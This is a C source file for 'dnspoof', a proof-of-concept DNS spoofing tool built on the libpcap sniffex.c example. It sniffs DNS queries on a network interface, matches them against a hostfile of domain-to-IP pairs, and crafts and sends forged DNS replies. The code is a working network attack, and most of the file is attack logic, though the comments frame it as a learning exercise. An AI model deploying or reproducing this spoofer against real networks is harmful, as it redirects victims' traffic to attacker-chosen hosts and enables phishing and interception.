/*

  Author:  Felix Bilstein
  Date:	   23-Dec-2015
  Comment: This is a proof-of-concept and a short example how to use libpcap in C.
           Interesting is for example the source for the calculation of the checksums as well
           as parsing different structures using buffers and struct castings (interesting for newbies in C),
           since this is a basic way in C to work with data.
           It is not designed to be used by anyone, more kind of a project to learn raw sockets and libpcap.

  File:    main.c

  http://www.tcpdump.org/sniffex.c
  The following code is a copy from sniffex.c

 ****************************************************************************
 * sniffex.c
 *
 * Sniffer example of TCP/IP packet capture using libpcap.
 * 
 * Version 0.1.1 (2005-07-05)
 * Copyright (c) 2005 The Tcpdump Group
 *
 * This software is intended to be used as a practical example and 
 * demonstration of the libpcap library; available at:
 * http://www.tcpdump.org/
 *
 ****************************************************************************
 *
 * This software is a modification of Tim Carstens' "sniffer.c"
 * demonstration source code, released as follows:
 * 
 * sniffer.c
 * Copyright (c) 2002 Tim Carstens
 * 2002-01-07
 * Demonstration of using libpcap
 * timcarst -at- yahoo -dot- com
 * 
 * "sniffer.c" is distributed under these terms:
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 4. The name "Tim Carstens" may not be used to endorse or promote
 *    products derived from this software without prior written permission
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 * <end of "sniffer.c" terms>
 *
 * This software, "sniffex.c", is a derivative work of "sniffer.c" and is
 * covered by the following terms:
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Because this is a derivative work, you must comply with the "sniffer.c"
 *    terms reproduced above.
 * 2. Redistributions of source code must retain the Tcpdump Group copyright
 *    notice at the top of this source file, this list of conditions and the
 *    following disclaimer.
 * 3. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 4. The names "tcpdump" or "libpcap" may not be used to endorse or promote
 *    products derived from this software without prior written permission.
 *
 * THERE IS ABSOLUTELY NO WARRANTY FOR THIS PROGRAM.
 * BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY
 * FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN
 * OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
 * PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED
 * OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS
 * TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE
 * PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING,
 * REPAIR OR CORRECTION.
 * 
 * IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
 * WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR
 * REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES,
 * INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING
 * OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED
 * TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY
 * YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER
 * PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGES.
 * <end of "sniffex.c" terms>
 * 
 ****************************************************************************
 */


#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <ctype.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <unistd.h>
#include <net/if.h>

#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <signal.h>
#include <unistd.h>

#include "printing.h"
#include "checksum.h"
#include "dns_spoofing.h"
#include "dns_spoofing_tuple.h"
#include "networking.h"
#include "file_io.h"

// Copied value from tcpdump project, see sniffer.c
#define SNAP_LEN 1518
//#define SIZE_ETHERNET 14			// see sizeof(struct ethhdr)
#define SIZE_ETHERNET ETH_HLEN		// from if_ether.h

//define INTERFACE "wlan0"

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

const char *hdr =
		"         _                              __ \n"
		"      __| |_ __  ___ _ __   ___   ___  / _|\n"
		"     / _` | '_ \\/ __| '_ \\ / _ \\ / _ \\| |_ \n"
		"    | (_| | | | \\__ \\ |_) | (_) | (_) |  _|\n"
		"     \\__,_|_| |_|___/ .__/ \\___/ \\___/|_|  \n"
		"                    |_|                    \n";

const char *better_think =
		"[1] Think before type!\n"
		"[2] With great power comes great responsibility!\n"
		"[3] Tool is only a proof-of-concept!\n"
		"    Usage: dnspoof <interface> <hostfile>\n";

spoof_tuple *st = NULL;
unsigned int st_len = 0;
char *INTERFACE = NULL;

int main(int argc, char *argv[]) {
	puts(hdr);
	puts(better_think);

	if(argc != 3) {
		printf("Usage: dnspoof <interface> <hostfile>\n");
		return EXIT_SUCCESS;
	}

	INTERFACE = argv[1];
	char *filename = argv[2];

	printf("We use this interface: %s\n", INTERFACE);
	printf("We use this text file: %s\n\n", filename);



	size_t file_length = fsize(filename);
	printf("file_length is: %u\n\n", file_length);
	int i;
	char *file_content = malloc(file_length*sizeof(char));
	if(file_content == NULL) {
		printf("malloc error @ file_content\n");
	}
	size_t fileLength = getFileContent(filename, file_content, file_length);
	if(fileLength == 0) {
		printf("error occured, file size is zero...\n");
		exit(-1);
	}
	for(i=0;file_content[i];i++) {
		if(file_content[i] == '|') {
			st_len++;
		}
	}
	st = malloc(st_len*sizeof(spoof_tuple));
	char *file = file_content;
	for(i=0;i<st_len;i++) {
		memset(st[i].name, 0, sizeof(st[i].name));
		memset(st[i].ip, 0, sizeof(st[i].ip));
		int name_len = index(file, '|')-file;
		memcpy(st[i].name, file, name_len);
		int ip_len = index(file, '\n')-index(file, '|')-1;
		memcpy(st[i].ip, file+name_len+1, ip_len);
		file = file + (index(file, '\n')-file+1);
		printf("%s %s\n", st[i].name, st[i].ip);
	}
	free(file_content);
	printf("\n");

	/*
	 * http://www.tcpdump.org/sniffex.c
	 * Following is a modified copy from sniffex.c
	 */

	char *dev = INTERFACE;		// Sniffing device is INTERFACE
	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
	pcap_t *handle;				/* packet capture handle */

	char filter_exp[] = "udp and dst port domain";		// get only dns packet
	struct bpf_program fp;		/* compiled filter program (expression) */
	bpf_u_int32 mask;			/* subnet mask */
	bpf_u_int32 net;			/* ip */
	int num_packets = 0;		/* number of packets to capture */

	/* get network number and mask associated with capture device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}

	/* print capture info */
	printf("Device: %s\n", dev);
	printf("Number of packets: %d\n", num_packets);
	printf("Filter expression: %s\n", filter_exp);

	/* open capture device */
	handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		exit(EXIT_FAILURE);
	}

	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", dev);
		exit(EXIT_FAILURE);
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n",
			filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* now we can set our callback function */
	pcap_loop(handle, num_packets, got_packet, NULL);

	printf("Back in Main\n");
	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(handle);
	free(st);
	printf("\nCapture complete.\n");

	return EXIT_SUCCESS;
}

void hack_name_to_packetstyle(u_char *name, char *converted_name, int len) {
	int i, count=0, str_len;

	str_len = strlen(name);
	memset(converted_name, 0, len);
	memcpy(converted_name, name, str_len);
	for(i=str_len-1;i!=0;i--) {
		if('.' == converted_name[i]) {
			converted_name[i] = (u_char) count;
		} else {
			count++;
		}
	}
}

int dns_domain_cmp(spoof_tuple *s, int s_len, const u_char *payload) {
	char converted_name[253];
	int i,str_len, cmp_value;

	if(s == NULL || payload == NULL) {
		return -1;
	}

	for(i=0;i<s_len;i++) {
		hack_name_to_packetstyle(s[i].name, converted_name, 253);
		str_len = strlen(converted_name);
		cmp_value = memcmp(converted_name, payload+13, str_len);
		//cmp_value = memcmp("abs", "", 3);
		if(cmp_value == 0) {
			printf("equal - sending poisoned udp for %s\n", s[i].name);
			return i;
		}
	}

	return -1;
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {

	u_char spoofed_packed_buffer[SNAP_LEN] = {0};
	unsigned int frame_length_spoofed = 0;

	static unsigned int count = 1;

	const struct ip *ip;
	const struct udphdr *udp;
	const u_char *payload;

	unsigned int size_ip;
	unsigned int size_udp;
	unsigned int size_payload;

	printf("\nPacket number %d:\n", count);
	count++;

	ip = (struct ip*)(packet + SIZE_ETHERNET);
	size_ip = ip->ip_hl*4;
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}

	/* print source and destination IP addresses */
	printf("       From: %s\n", inet_ntoa(ip->ip_src));
	printf("         To: %s\n", inet_ntoa(ip->ip_dst));

	udp = (struct udphdr*)(packet + SIZE_ETHERNET + size_ip);
	size_udp = 2*sizeof(u_int32_t);		// header is 8 Byte always!

	printf("   Src port: %d\n", ntohs(udp->uh_sport));
	printf("   Dst port: %d\n", ntohs(udp->uh_dport));

	/* define/compute udp payload (segment) offset */
	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_udp);

	/* compute udp payload (segment) size */
	size_payload = ntohs(ip->ip_len) - (size_ip + size_udp);

	if(st == NULL || st_len == 0) {
		printf("Something nasty happened...\n");
		return;
	}

	int ip_val = dns_domain_cmp(st, st_len, payload);
	if(ip_val < 0) {
		/*
		 * if domain is not in our list, we will not spoof the ip.
		 */
		return;
	}

	frame_length_spoofed = craft_packet(args, header, packet, spoofed_packed_buffer, spoof_dns_payload, st[ip_val].ip);
	printf("crafting successful - size of new packet: %d\n", frame_length_spoofed);
	//print_payload(spoofed_packed_buffer, frame_length_spoofed);
	send_spoofed_frame(INTERFACE, spoofed_packed_buffer, frame_length_spoofed);
	printf("leaving got_packet\n");
	return;
}
